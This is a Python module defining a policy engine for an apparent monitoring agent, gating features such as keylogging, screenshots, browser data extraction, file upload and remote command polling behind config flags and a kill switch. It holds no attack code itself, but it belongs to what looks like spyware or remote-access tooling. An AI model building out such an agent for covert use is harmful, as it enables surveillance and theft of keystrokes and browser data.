"""
Policy engine - central gatekeeper for all agent features.
Checks kill switch and feature permissions before allowing any operation.
"""

import logging
from typing import Optional

from .config_manager import ConfigManager, get_config_manager

logger = logging.getLogger(__name__)


class PolicyEngine:
    """
    Central policy enforcement for the agent.
    All features must check with the PolicyEngine before executing.
    """
    
    def __init__(self, config_manager: ConfigManager):
        self.config_manager = config_manager
    
    def is_feature_allowed(self, feature: str) -> bool:
        """
        Check if a feature is allowed to execute.
        Returns False if kill switch is active or feature is disabled.
        """
        config = self.config_manager.config
        
        # Kill switch blocks everything except config sync
        if config.kill_switch and feature != 'config_sync':
            logger.debug(f"Feature '{feature}' blocked by kill switch")
            return False
        
        # Check specific feature flags
        feature_map = {
            'screenshot': config.screenshots_enabled,
            'keylogger': config.keylogger_enabled,
            'browser_trigger': config.browser_triggers_enabled,
            'file_upload': config.file_upload_enabled,
            'browser_data': config.browser_data_enabled,
            'config_sync': True,  # Always allowed
            'command_poll': not config.kill_switch,  # Blocked by kill switch
            'heartbeat': True,  # Always allowed
        }
        
        allowed = feature_map.get(feature, False)
        
        if not allowed:
            logger.debug(f"Feature '{feature}' is disabled")
        
        return allowed
    
    def can_take_screenshot(self) -> bool:
        """Check if screenshots are allowed."""
        return self.is_feature_allowed('screenshot')
    
    def can_log_keys(self) -> bool:
        """Check if keylogging is allowed."""
        return self.is_feature_allowed('keylogger')
    
    def can_trigger_on_browser(self) -> bool:
        """Check if browser-triggered screenshots are allowed."""
        return (
            self.is_feature_allowed('browser_trigger') and 
            self.is_feature_allowed('screenshot')
        )
    
    def can_upload_files(self) -> bool:
        """Check if file uploads are allowed."""
        return self.is_feature_allowed('file_upload')
    
    def can_execute_commands(self) -> bool:
        """Check if command execution is allowed."""
        return self.is_feature_allowed('command_poll')
    
    def can_extract_browser_data(self) -> bool:
        """Check if browser data extraction is allowed."""
        return self.is_feature_allowed('browser_data')
    
    def get_config_value(self, key: str, default=None):
        """Get a specific config value."""
        config = self.config_manager.config
        return getattr(config, key, default)
    
    def get_monitored_browsers(self) -> list:
        """Get list of browser processes to monitor."""
        return self.config_manager.config.monitored_browsers
    
    def get_screenshot_quality(self) -> int:
        """Get screenshot JPEG quality setting."""
        return self.config_manager.config.screenshot_quality
    
    def get_keylog_sync_interval(self) -> int:
        """Get keylog sync interval in seconds."""
        return self.config_manager.config.keylog_sync_interval

    def get_browser_sync_interval(self) -> int:
        """Get browser data sync interval in seconds."""
        return self.config_manager.config.browser_history_sync_interval


# Singleton instance
_policy_engine: Optional[PolicyEngine] = None


def get_policy_engine() -> Optional[PolicyEngine]:
    """Get the policy engine instance."""
    return _policy_engine


def init_policy_engine(config_manager: ConfigManager) -> PolicyEngine:
    """Initialize the policy engine singleton."""
    global _policy_engine
    _policy_engine = PolicyEngine(config_manager)
    return _policy_engine
